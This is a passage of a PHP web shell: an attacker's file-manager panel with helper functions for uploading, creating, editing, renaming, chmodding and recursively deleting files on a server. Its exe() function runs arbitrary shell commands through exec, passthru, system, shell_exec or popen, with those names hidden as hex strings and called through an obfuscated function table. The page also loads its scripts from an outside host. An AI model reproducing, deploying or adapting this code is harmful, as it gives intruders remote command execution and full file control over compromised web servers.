                ?>&nbsp;&nbsp;<a href="#" onclick="loadFolder('<?php echo strReplace($home_s); ?>')"><i class="fa fa-house"></i></a>
                <?php
                if ($win) {
                    echo "<br>&nbsp;Disk: ";
                    echo showDrives();
                }
                ?>
                </p>
            <div class="row g-4">
                    <div class="col-sm-12 col-xl-9">
                        <div id="file-man">
                        </div>
                    </div>
            <!-- Form upload file start -->
            <div class="col-md-3" style="max-height: 170px;">
                <div class="bg-secondary rounded h-100 p-4">
                    <h6 class="panel-title">File Uploader</h6>
                    <div id="status-upload">
                        <form id="form_upload_file" action="" method="POST" enctype="multipart/form-data">
                            <div class="mb-3">                               
                                <input type="file" class="form-control bg-dark" name="file" id="file"/>
                            </div> 
                            <div class="form-group">
                            <button class="btn btn-primary w-100 m-0"><i class="fa fa-upload"></i> Upload File</button>
                            </div>
                        </form>
                    </div>
                </div>
            <!-- Form upload file end -->
            <br>
            <!-- Form new folder start -->
                <div class="bg-secondary rounded h-100 p-4">
                    <h6 class="panel-title">New Folder</h6>
                    <div id="status-nd">
                        <form id="form_buat_folder">
                            <div class="mb-3">                               
                                <input type="text" class="form-control bg-dark" name="nama_folder" id="nama_folder" placeholder="New Folder" />
                            </div> 
                            <div class="form-group">
                            <button class="btn btn-primary w-100 m-0"><i class="fa fa-folder-plus"></i> Create Folder</button>
                            </div>
                        </form>
                    </div>
                </div>
            <!-- Form new folder end -->
            <br>
            <!-- Form new file start -->
                <div class="bg-secondary rounded h-100 p-4">
                    <h6 class="panel-title">New File</h6>
                    <div id="status-nf">
                        <form id="form_buat_file">
                            <div class="mb-3">                               
                                <input type="text" class="form-control bg-dark" name="nama_file" id="nama_file" placeholder="New File" />
                            </div> 
                            <div class="form-group">
                            <button class="btn btn-primary w-100 m-0"><i class="fa fa-file-import"></i> Create File</button>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
            <!-- Form new file end -->

        </div>
        </div>
            <!-- Menu End -->
        </div>
        <!-- Content End -->


        <!-- Back to Top -->
        <a href="#" class="btn btn-lg btn-primary btn-lg-square back-to-top"><i class="bi bi-arrow-up"></i></a>
    </div>

    <!-- JavaScript Libraries -->
    <script src="https://code.jquery.com/jquery-3.4.1.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/js/all.min.js" integrity="sha512-b+nQTCdtTBIRIbraqNEwsjB6UvL3UEMkXnhzd8awtCYh0Kcsjl9uEgwVFVbhoj3uu1DO1ZMacNvLoyJJiNfcvg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <script src="https://initial-b.web.id/dark/lib/chart/chart.min.js"></script>
    <script src="https://initial-b.web.id/dark/lib/easing/easing.min.js"></script>
    <script src="https://initial-b.web.id/dark/lib/waypoints/waypoints.min.js"></script>
    <script src="https://initial-b.web.id/dark/lib/owlcarousel/owl.carousel.min.js"></script>
    <script src="https://initial-b.web.id/dark/lib/tempusdominus/js/moment.min.js"></script>
    <script src="https://initial-b.web.id/dark/lib/tempusdominus/js/moment-timezone.min.js"></script>
    <script src="https://initial-b.web.id/dark/lib/tempusdominus/js/tempusdominus-bootstrap-4.min.js"></script>

    <!-- Template Javascript -->
    <script src="https://initial-b.web.id/dark/js/main.js"></script>
    <script src="https://initial-b.web.id/dark/js/functions.js"></script>

  <script>
    $(document).ready(function() {
      // Proses AJAX
      var urlParams = new URLSearchParams(window.location.search);
      var menu = urlParams.get('menu');

      if (menu) {
        bukaMenu(menu);
      } else {
        loadFolder('<?php echo $dir; ?>');
      }
    });


    
  </script>
</body>
</html>
<?php
function strReplace($nama){
  echo str_replace("\\","/",$nama);
}

function shorting($value){
    if (strlen($value) > 20) {
        return substr($value, 0, 20) . "...";
    } else {
        return $value;
    }
}

function showDrives()
    {
        foreach(range('A','Z') as $drive)
        {
            if($GLOBALS['func'][2]($drive.':'))
            {
                ?>
                <a href="#" class="text-warning" data-path="<?php echo $drive.':'; ?>" onclick='loadFolder("<?php echo $drive.':'; ?>")'>
                    <strong><?php echo $drive.":\\" ?></strong>
                </a> 
                <?php
            }
        }
    }

function exe($in) {
    $buff = '';
    if (function_exists("\x65\x78\x65\x63")) {
        @$GLOBALS['func'][16]($in,$buff);
        $buff = @join("\n",$buff);
    } elseif (function_exists("\x70\x61\x73\x73\x74\x68\x72\x75")) {
        ob_start();
        @$GLOBALS['func'][17]($in);
        $buff = ob_get_clean();
    } elseif (function_exists("\x73\x79\x73\x74\x65\x6d")) {
        ob_start();
        @$GLOBALS['func'][18]($in);
        $buff = ob_get_clean();
    } elseif (function_exists("\x73\x68\x65\x6c\x6c\x5f\x65\x78\x65\x63")) {
        $buff = $GLOBALS['func'][19]($in);
    } elseif (is_resource($f = @$GLOBALS['func'][20]($in,"r"))) {
        $buff = "";
        while(!@feof($f))
            $buff .= fread($f,1024);
        pclose($f);
    }else return "↳ Unable to execute command\n";
    return ($buff==''?"↳ Query did not return anything\n":$buff);
}

function hdd($s) {
    if($s >= 1073741824)
    return sprintf('%1.2f',$s / 1073741824 ).' GB';
    elseif($s >= 1048576)
    return sprintf('%1.2f',$s / 1048576 ) .' MB';
    elseif($s >= 1024)
    return sprintf('%1.2f',$s / 1024 ) .' KB';
    else
    return $s .' B';
}

function perms($file){
    $perms = @$GLOBALS['func'][6]($file);
    if (($perms & 0xC000) == 0xC000) {
    // Socket
    $info = 's';
    } elseif (($perms & 0xA000) == 0xA000) {
    // Symbolic Link
    $info = 'l';
    } elseif (($perms & 0x8000) == 0x8000) {
    // Regular
    $info = '-';
    } elseif (($perms & 0x6000) == 0x6000) {
    // Block special
    $info = 'b';
    } elseif (($perms & 0x4000) == 0x4000) {
    // Directory
    $info = 'd';
    } elseif (($perms & 0x2000) == 0x2000) {
    // Character special
    $info = 'c';
    } elseif (($perms & 0x1000) == 0x1000) {
    // FIFO pipe
    $info = 'p';
    } else {
    // Unknown
    $info = 'u';
    }
        // Owner
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ?
    (($perms & 0x0800) ? 's' : 'x' ) :
    (($perms & 0x0800) ? 'S' : '-'));
    // Group
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ?
    (($perms & 0x0400) ? 's' : 'x' ) :
    (($perms & 0x0400) ? 'S' : '-'));
    // World
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ?
    (($perms & 0x0200) ? 't' : 'x' ) :
    (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}

function formatSize($bytes){ 
$label = array('B', 'KB', 'MB', 'GB', 'TB', 'PB');

        for ($i = 0; $bytes >= 1024 && $i < (count($label) - 1); $bytes /= 1024, $i++) ;

        return (round($bytes, 2) . " " . $label[$i]);
}

function folderSize($dir){
    $dir = rtrim(str_replace('\\', '/', $dir), '/');

    if ($GLOBALS['func'][2]($dir) === true) {
        $totalSize = 0;
        // If on a Unix Host (Linux, Mac OS)
        if ($GLOBALS['os'] !== 'win') {
            $io = $GLOBALS['func'][20]('/usr/bin/du -sb ' . $dir, 'r');
            if ($io !== false) {
                $totalSize = intval(fgets($io, 80));
                $GLOBALS['func'][21]($io);
                return $totalSize;
            }
        }
        // If on a Windows Host (WIN32, WINNT, Windows)
        if ($GLOBALS['os'] === 'win' && extension_loaded('com_dotnet')) {
            $obj = new \COM('scripting.filesystemobject');
            if (is_object($obj)) {
                $ref       = $obj->getfolder($dir);
                $totalSize = $ref->size;
                $obj       = null;
                return $totalSize;
            }
        }
        // If System calls did't work, use slower PHP 5
        $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir), RecursiveIteratorIterator::LEAVES_ONLY,RecursiveIteratorIterator::CATCH_GET_CHILD);
        foreach ($files as $file) {
            $totalSize += $file->getSize();
        }
        return $totalSize;
    } else if ($GLOBALS['func'][3]($dir) === true) {
        return filesize($dir);
    }
}

function validasi($string,$ext) {
foreach((array)$ext as $extensi) {
    if(stristr($string,(string) $extensi)){
        return true;
    }
}
return false;
}

function hashID($data){
$url = 'https://hashes.com/en/api/identifier';
$data=array("hash"=>"$data",
"extended"=> true);
 
$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_POST, 1);
curl_setopt($curl, CURLOPT_POSTFIELDS, $data);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
$response = curl_exec($curl);
return $response; 
}

function hex($string)
{
    $result = '';
    for ($i = 0; $i < strlen($string); $i++) {
        $result .= dechex(ord($string[$i]));
    }
    return $result;
}

function unx($string)
{
    $result = '';
    for ($i = 0; $i < strlen($string) - 1; $i += 2) {
        $result .= chr(hexdec($string[$i] . $string[$i + 1]));
    }
    return $result;
}

function div_head($title){
  echo '
            <div class="bg-secondary rounded h-100 p-4">
            <h6 class="mb-4">'.$title.'</h3>
                               <div id="konten">';
}

function div_foot(){
  echo "</div>
        </div>";
}

function success($text){
    echo '<div class="alert alert-success alert-dismissible fade show" role="alert">
                                <i class="fa fa-exclamation-circle me-2"></i>'.$text.'
                                <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
                            </div>';
}

function failed($text){
    echo '<div class="alert alert-danger alert-dismissible fade show" role="alert">
                                <i class="fa fa-exclamation-circle me-2"></i>'.$text.'
                                <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
                            </div>';
}

function buat_folder($nama_folder) {
    if (empty($nama_folder)) {
        failed("Folder name cannot be empty!");
        return;
    }
    $path = $_SESSION['path'];
    $folderPath = $path . '/' . $nama_folder;
    if($GLOBALS['func'][4]($path) && $GLOBALS['func'][5]($path)){
        if (!$GLOBALS['func'][2]($folderPath)) {
            $GLOBALS['func'][12]($folderPath, 0777);
            success("$nama_folder created successfully!");
        } else {
            failed("Folder $nama_folder exists!");
        }
        } else {
            failed("Create Folder Failed (Directory is not Writable)!");
        }
    }


function buat_file($nama_file) {
    if (empty($nama_file)) {
        failed("File name cannot be empty!");
        return;
    }

    if ($GLOBALS['func'][39]($nama_file)) {
        failed("$nama_file Exists!");
        return;
    }

    $path = $_SESSION['path'] . '/' . $nama_file;

    if($GLOBALS['func'][4]($_SESSION['path']) && $GLOBALS['func'][5]($_SESSION['path'])){
        try {
            $fp = $GLOBALS['func'][26]($path, 'w');
            $GLOBALS['func'][27]($fp);
            success($nama_file." created successfully!");
        } catch (Exception $e) {
            failed("Error: ". $e->getMessage());
        }
    } else {
        failed("Create File Failed (Directory is not Writable)!");
    }
}

function doRename($nama_file) {
    if($GLOBALS['func'][4]($nama_file) && $GLOBALS['func'][5]($nama_file)){
        $ext = pathinfo($nama_file);
        $baseName = $ext['basename'];
        echo '
    <div id="simpan"></div>
    <form id="form_rename_file">
    <input type="hidden" name="nama_file" value="' . $nama_file . '">
    <input type="hidden" name="aksi" value="rename_file">
    <input type="text" class="form-control w-100 m-0 text-white" id="newname" name="newname" value="'.$baseName.'">
    </form>
    <br>
    <div class="form-group">
    <button onclick="doRename()" class="btn btn-primary w-100 m-0"><i class="fa fa-save"></i> Save</button> 
    </div>
    <br>
    ';
    } else {
        failed("Failed to open $baseName!");
        return;
    }
}

function doCmod($nama_file) {
        $ext = pathinfo($nama_file);
        $baseName = $ext['basename'];
        echo '
    <div id="simpan"></div>
    <form id="form_cmod">
    <input type="hidden" name="nama_file" value="' . $nama_file . '">
    <input type="hidden" name="aksi" value="cmod_file">
    <input type="text" class="form-control w-100 m-0 text-white" id="perms" name="perms" value="'.substr(sprintf('%o', $GLOBALS['func'][6]($nama_file)), -4).'">
    </form>
    <br>
    <div class="form-group">
    <button onclick="doCmod()" class="btn btn-primary w-100 m-0"><i class="fa fa-save"></i> Save</button> 
    </div>
    <br>';
}

function rrmdir($dir) {
  if ($GLOBALS['func'][2]($dir)) {
    $objects = $GLOBALS['func'][37]($dir);
    foreach ($objects as $object) {
      if ($object != "." && $object != "..") {
        if ($GLOBALS['func'][2]($dir . "/" . $object))
          rrmdir($dir . "/" . $object);
        else
          $GLOBALS['func'][24]($dir . "/" . $object);
      }
    }
    $GLOBALS['func'][25]($dir);
  }
}

function unzip($zip_file, $destination) {
  $zip = new ZipArchive;
  if ($zip->open($zip_file) === TRUE) {
    $zip->extractTo($destination);
    $zip->close();
    return true;
  } else {
    return false;
  }
}


function addFolderToZip($zip, $folder, $prefix) {
  $files = $GLOBALS['func'][37]($folder);
  foreach ($files as $file) {
    if ($file != '.' && $file != '..') {
      $filePath = $folder . '/' . $file;
      if (is_dir($filePath)) {
        $zip->addEmptyDir($prefix . $file . '/');
        addFolderToZip($zip, $filePath, $prefix . $file . '/');
      } else {
        $zip->addFile($filePath, $prefix . $file);
      }
    }
  }
}


function hapusin($del) {
  if (empty($del)) {
    failed("Folder name cannot be empty!");
    return false;
  }
  if (!$GLOBALS['func'][39]($del)) {
    failed("$del not found!");
    return false;
  }
  if($GLOBALS['func'][4]($del) && $GLOBALS['func'][5]($del)){
    if ($GLOBALS['func'][3]($del)) {
      $GLOBALS['func'][24]($del);
      return true;
    } elseif ($GLOBALS['func'][2]($del)) {
      rrmdir($del);
      return true;
    } else {
      return false;
    }
  } else {
    failed("Error to delete $del!");
    return false;
  }
}



function edit_file($nama_file, $isi_file) {
    $fp = $GLOBALS['func'][26]($nama_file, 'w');
    if ($fp === false) {
        return false; // Gagal membuka file
    }
    $hasil = $GLOBALS['func'][38]($fp, $isi_file);
    $GLOBALS['func'][27]($fp);
    return $hasil; // Mengembalikan jumlah byte yang ditulis
}


function tampilkan_form_edit($nama_file) {
  if($GLOBALS['func'][5]($nama_file)){
  $konten = $GLOBALS['func'][10]($GLOBALS['func'][11]($nama_file));
  $ext = pathinfo($nama_file);
  $eks = $ext['extension'];
  $baseName = $ext['basename'];
  echo '
    <p>
    File Name : <a title="Rename" href="#" onclick="rename(\''.$nama_file.'\')">'.$baseName.'</a>
    <br>File Type : <font style="text-transform: uppercase;">'.$eks.'</font>
    <br>File Size : ';
    $size = filesize($nama_file);
    echo formatSize($size)."</p>";
    if(validasi($eks,$GLOBALS['ektensi']['image'])){
        $imageData = $GLOBALS['func'][33]($GLOBALS['func'][11]($nama_file));
        $src = 'data: '.$eks.';base64,'.$imageData;
        echo '<center><img src="' . $src . '"></center>';
    }else{
      echo '
    <form id="form_edit_file">
    <input type="hidden" name="nama_file" value="' . $nama_file . '">
    <input type="hidden" name="aksi" value="edit_file">
    <textarea is="highlighted-code" cols="80" rows="12" language="'.$eks.'" tab-size="2" style="resize: vertical; max-height: 500px; min-height: 250px;" class="form-control w-100 m-0 text-muted" name="isi_file">'.$konten.'</textarea>
    </form>
    <br>
    <div class="form-group">
    <button onclick="kirimForm()" class="btn btn-primary w-100 m-0"><i class="fa fa-save"></i> Save</button> 
    </div>
    <br>
    <div id="simpan"></div>
    ';
    }

  }else{
    echo "<div class='alert alert-danger'>Failed to open $baseName</div>";
  }
}

?>

